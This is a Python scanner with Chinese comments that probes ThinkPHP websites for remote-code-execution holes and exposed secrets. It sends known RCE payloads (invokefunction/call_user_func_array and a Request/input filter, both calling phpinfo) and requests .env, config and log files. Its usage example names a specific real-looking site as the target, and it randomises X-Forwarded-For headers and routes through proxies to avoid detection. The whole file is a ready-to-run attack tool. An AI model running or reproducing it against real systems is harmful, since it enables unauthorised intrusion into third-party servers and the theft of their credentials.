#!/usr/bin/env python3
"""
ThinkPHP 常见路径 / 报错 / RCE 探测。

示例:
  python3 thinkphp_scan.py -u https://s.sggyx.com
  python3 thinkphp_scan.py -u https://TARGET --xff
"""
from __future__ import annotations

import argparse
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, load_proxy, log, random_xff_headers, save_hit

PATHS = [
    "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    "/index.php?s=captcha",
    "/index.php?s=/admin",
    "/?s=index/\\think\\Request/input&filter=phpinfo&data=1",
    "/runtime/log/",
    "/runtime/log/202507/03.log",
    "/app/Config/app.php",
    "/.env",
    "/install.php",
    "/install.lock",
    "/thinkphp/library/think/App.php",
    "/vendor/topthink/framework/README.md",
    "/public/index.php",
]


def probe(base: str, path: str, timeout: int, proxy: str, use_xff: bool) -> tuple[str, dict]:
    url = base.rstrip("/") + path
    headers = {"User-Agent": DEFAULT_UA}
    if use_xff:
        headers.update(random_xff_headers())
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = requests.get(url, headers=headers, timeout=timeout, proxies=proxies, verify=False, allow_redirects=False)
        body = r.text[:2000]
        interesting = any(x in body.lower() for x in (
            "thinkphp", "phpinfo", "stack trace", "fatal error", "sqlstate",
            "call_user_func", "vendor/topthink", "app\\", "runtime",
        )) or r.status_code in (403, 500)
        return path, {"status": r.status_code, "interesting": interesting, "snippet": body[:300]}
    except Exception as e:
        return path, {"error": str(e), "interesting": False}


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="ThinkPHP 扫描")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-w", "--workers", type=int, default=10)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--xff", action="store_true")
    ap.add_argument("--out", default="/data/tools/faka/out/thinkphp_scan.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = load_proxy() if args.proxy == "auto" else ("" if args.proxy == "none" else args.proxy)
    hits = 0
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(probe, args.url, p, args.timeout, proxy, args.xff): p for p in PATHS}
        for fut in as_completed(futs):
            path, res = fut.result()
            if res.get("interesting"):
                hits += 1
                save_hit(Path(args.out), "thinkphp_hit", {"url": args.url, "path": path, **res})
                log(f"[+] {path} [{res.get('status')}] {res.get('snippet','')[:120]}")
            else:
                log(f"[-] {path} [{res.get('status', '?')}]")
    log(f"完成 hits={hits} -> {args.out}")


if __name__ == "__main__":
    main()
